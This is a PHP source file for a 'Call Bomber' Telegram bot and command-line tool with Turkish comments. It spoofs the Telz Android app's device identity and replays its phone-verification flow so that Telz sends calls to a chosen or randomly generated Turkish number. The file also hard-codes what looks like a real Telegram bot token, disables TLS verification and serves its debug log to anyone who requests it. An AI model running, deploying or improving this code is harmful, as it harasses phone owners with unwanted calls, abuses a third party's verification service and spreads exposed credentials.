<?php
/**
 * Ritalin Tool Call Bomber - GZIP FIXED
 * Gzip sıkıştırması manuel olarak çözülüyor
 */

// ==================== KONFIGÜRASYON ====================
define('MODE', 'TEST_RANDOM_IDS');
define('BASE_URL', 'https://api.telz.com/');
define('USER_AGENT', 'Telz-Android/17.5.33');
define('APP_VERSION', '17.5.33');
define('OS', 'android');
define('OS_VERSION', '15');
define('LOOP_INTERVAL', 20);

// ==================== TELEGRAM BOT KONFIG ====================
define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');

$BANNED_NUMBERS = [''];

$VALID_ANDROID_IDS = [
    '13e50e93a6399e67',
    'a3f8c91d2b4e6f78',
    '9c4d2e1a5b8f7g3h',
    '7f3e2d1c9b4a5f6e',
    'e8f7g6h5i4j3k2l1',
    'b5c6d7e8f9g0h1i2',
    'z9y8x7w6v5u4t3s2',
    'q1w2e3r4t5y6u7i8',
];

function debugLog($message, $type = 'INFO') {
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] [$type] $message\n";
    file_put_contents('telz_debug.log', $logEntry, FILE_APPEND);
    if (php_sapi_name() === 'cli') echo $logEntry;
}

function debugLogRequest($endpoint, $payload, $body, $httpCode, $headers, $decoded = null) {
    $log = "\n" . str_repeat("=", 70) . "\n";
    $log .= "📤 [REQUEST] $endpoint\n";
    $log .= "⏰ " . date('Y-m-d H:i:s') . "\n";
    $log .= "📦 PAYLOAD: " . json_encode($payload, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
    $log .= "📥 [RESPONSE] HTTP $httpCode\n";
    $log .= "📋 HEADERS:\n$headers\n";
    $log .= "📄 BODY: " . substr($body, 0, 2000) . "\n";
    
    if ($decoded !== null) {
        $log .= "✅ JSON PARSE BAŞARILI\n";
        $log .= "🔍 PARSED: " . json_encode($decoded, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
    } else {
        $log .= "❌ JSON PARSE HATASI!\n";
    }
    $log .= str_repeat("=", 70) . "\n";
    file_put_contents('telz_debug.log', $log, FILE_APPEND);
}

function getValidAndroidId() {
    global $VALID_ANDROID_IDS;
    return $VALID_ANDROID_IDS[array_rand($VALID_ANDROID_IDS)];
}

function randomDeviceName() {
    $brands = ['Pixel 6', 'Pixel 7', 'Pixel 8', 'Xiaomi 13', 'Xiaomi 14', 'Samsung S23', 'Samsung S24', 'OnePlus 11', 'OnePlus 12', 'Moto G84'];
    return $brands[array_rand($brands)] . '-' . strtoupper(substr(bin2hex(random_bytes(2)), 0, 4));
}

function generateUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function generateRandomTurkishNumber() {
    $operators = ['505', '506', '507', '530', '531', '532', '533', '534', '535', '536', '537', '538', '539', '540', '541', '542', '543', '544', '545', '546', '547', '548', '549', '550', '551', '552', '553', '554', '555', '556', '557', '558', '559', '560', '561', '562', '563', '564', '565', '566', '567', '568', '569'];
    $operator = $operators[array_rand($operators)];
    $number = $operator . str_pad(mt_rand(0, 9999999), 7, '0', STR_PAD_LEFT);
    return '+90' . $number;
}

function isBannedNumber($phone) {
    global $BANNED_NUMBERS;
    $cleanPhone = str_replace(['+', ' ', '-', '(', ')'], '', $phone);
    foreach ($BANNED_NUMBERS as $banned) {
        $cleanBanned = str_replace(['+', ' ', '-', '(', ')'], '', $banned);
        if ($cleanPhone === $cleanBanned) return true;
    }
    return false;
}

function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
    if ($androidId === null) $androidId = getValidAndroidId();
    if ($uuid === null) $uuid = generateUUID();
    
    $payload['android_id'] = $androidId;
    $payload['app_version'] = APP_VERSION;
    $payload['os'] = OS;
    $payload['os_version'] = OS_VERSION;
    $payload['ts'] = (int)(microtime(true) * 1000);
    $payload['uuid'] = $uuid;
    
    $ch = curl_init(BASE_URL . $endpoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: ' . USER_AGENT,
        'Accept-Encoding: gzip, deflate',
        'Content-Type: application/json; charset=UTF-8',
        'Accept: application/json'
    ]);
    curl_setopt($ch, CURLOPT_ENCODING, '');  // Tüm encoding'leri kabul et
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    $headers = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    
    // 🔥 GZIP MANUEL DECOMPRESS
    $isGzip = strpos($headers, 'content-encoding: gzip') !== false;
    if ($isGzip) {
        $decodedBody = gzdecode($body);
        if ($decodedBody !== false) {
            $body = $decodedBody;
            debugLog("✅ Gzip decompress başarılı", 'GZIP');
        } else {
            debugLog("❌ Gzip decompress başarısız", 'GZIP');
        }
    }
    
    $decoded = json_decode($body, true);
    debugLogRequest($endpoint, $payload, $body, $httpCode, $headers, $decoded);
    
    if ($httpCode === 429) throw new Exception("Fazla deneme!");
    if ($httpCode >= 400) throw new Exception("HTTP Hata: $httpCode");
    if ($error) throw new Exception("CURL Hatası: $error");
    
    if (isset($decoded['status']) && $decoded['status'] === 'not_allowed') {
        throw new Exception("API Engellendi (4.2)");
    }
    
    return $decoded ?? $body;
}

function sendCall($phone) {
    debugLog("📞 Arama başlatılıyor: $phone", 'START');
    
    if (isBannedNumber($phone)) {
        debugLog("🚫 Yasaklı numara: $phone", 'BANNED');
        return ['success' => false, 'message' => "❌ Bu numara kullanılamaz!"];
    }
    
    try {
        $androidId = getValidAndroidId();
        $uuid = generateUUID();
        $deviceName = randomDeviceName();
        
        debugLog("🆔 Android ID: $androidId", 'ANDROID');
        
        telzRequest('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
        debugLog("✅ auth_list başarılı", 'STEP');
        
        telzRequest('app/run', [
            'event' => 'run',
            'device_name' => $deviceName,
            'ipv4_address' => '10.1.10.1',
            'ipv6_address' => 'FE80::1',
            'lang' => 'tr',
            'network_country' => 'tr',
            'network_type' => '4G',
            'roaming' => 'no',
            'root' => 'no',
            'run_id' => '',
            'sim_country' => 'tr'
        ], $androidId, $uuid);
        debugLog("✅ run başarılı", 'STEP');
        
        telzRequest('app/stat_btns', [
            'event' => 'stat_btns',
            'btn' => 'on_reg_continue'
        ], $androidId, $uuid);
        debugLog("✅ stat_btns başarılı", 'STEP');
        
        telzRequest('app/validate_phonenumber', [
            'event' => 'validate_phonenumber',
            'phone' => $phone,
            'region' => 'TR'
        ], $androidId, $uuid);
        debugLog("✅ validate_phonenumber başarılı", 'STEP');
        
        $result = telzRequest('app/auth_call', [
            'event' => 'auth_call',
            'phone' => $phone,
            'attempt' => '0',
            'lang' => 'tr'
        ], $androidId, $uuid);
        
        debugLog("📊 auth_call sonucu: " . json_encode($result), 'RESULT');
        
        if (isset($result['status']) && $result['status'] === 'ok') {
            debugLog("✅ ARAMA BAŞARILI: $phone", 'SUCCESS');
            return ['success' => true, 'message' => "✅ Arama gönderildi: $phone"];
        } else {
            $error = $result['reason'] ?? json_encode($result) ?? 'Bilinmeyen';
            debugLog("❌ ARAMA BAŞARISIZ: $error", 'ERROR');
            return ['success' => false, 'message' => "❌ Hata: $error"];
        }
        
    } catch (Exception $e) {
        debugLog("❌ EXCEPTION: " . $e->getMessage(), 'ERROR');
        return ['success' => false, 'message' => "❌ Hata: " . $e->getMessage()];
    }
}

function sendTelegramMessage($chatId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML'];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

// ==================== WEBHOOK ====================
if (php_sapi_name() !== 'cli') {
    $content = file_get_contents('php://input');
    $update = json_decode($content, true);
    
    if (isset($_GET['setwebhook'])) {
        $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
        $result = file_get_contents($url);
        echo $result;
        exit;
    }
    
    if (isset($_GET['log'])) {
        header('Content-Type: text/plain; charset=utf-8');
        echo file_exists('telz_debug.log') ? file_get_contents('telz_debug.log') : "Log yok";
        exit;
    }
    
    if (isset($_GET['clearlog'])) {
        file_put_contents('telz_debug.log', '');
        echo "Log temizlendi.";
        exit;
    }
    
    if ($update && isset($update['message'])) {
        $chatId = $update['message']['chat']['id'];
        $text = $update['message']['text'] ?? '';
        $username = $update['message']['from']['username'] ?? 'bilinmeyen';
        
        debugLog("📨 Komut: $username ($chatId): $text", 'COMMAND');
        
        if ($text === '/start') {
            sendTelegramMessage($chatId, "📞 <b>Call Bomber v4 (Gzip Fixed)</b>\n\n"
                . "Komutlar:\n"
                . "/call +905551234567 - Arama gönder\n"
                . "/random - Rastgele numara\n"
                . "/status - Bot durumu");
            exit;
        }
        
        if ($text === '/log') {
            if (file_exists('telz_debug.log')) {
                $log = file_get_contents('telz_debug.log');
                $log = substr($log, -4000);
                sendTelegramMessage($chatId, "<pre>" . htmlspecialchars($log) . "</pre>");
            } else {
                sendTelegramMessage($chatId, "Log dosyası yok.");
            }
            exit;
        }
        
        if ($text === '/random') {
            $randomPhone = generateRandomTurkishNumber();
            debugLog("🎲 Rastgele numara: $randomPhone", 'RANDOM');
            sendTelegramMessage($chatId, "📞 Rastgele: <code>$randomPhone</code>\n⏳ Gönderiliyor...");
            $result = sendCall($randomPhone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        if (strpos($text, '/call ') === 0) {
            $phone = trim(substr($text, 6));
            if (empty($phone)) {
                sendTelegramMessage($chatId, "❌ Numara girin: /call +905551234567");
                exit;
            }
            sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
            $result = sendCall($phone);
            sendTelegramMessage($chatId, $result['message']);
            exit;
        }
        
        if ($text === '/status') {
            sendTelegramMessage($chatId, "✅ Bot aktif v4 ");
            exit;
        }
        
        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start");
        exit;
    }
    
    $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
    if ($phone) {
        $result = sendCall($phone);
        header('Content-Type: application/json');
        echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);
        exit;
    }
    
    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber v4 ']);
    exit;
}

if (php_sapi_name() === 'cli') {
    echo "\n📞 CALL BOMBER v4 ";
    $phone = readline("Numara gir (+90xx): ");
    $phone = trim($phone);
    if (empty($phone)) exit("❌ Numara girilmedi.\n");
    $result = sendCall($phone);
    echo $result['message'] . "\n";
}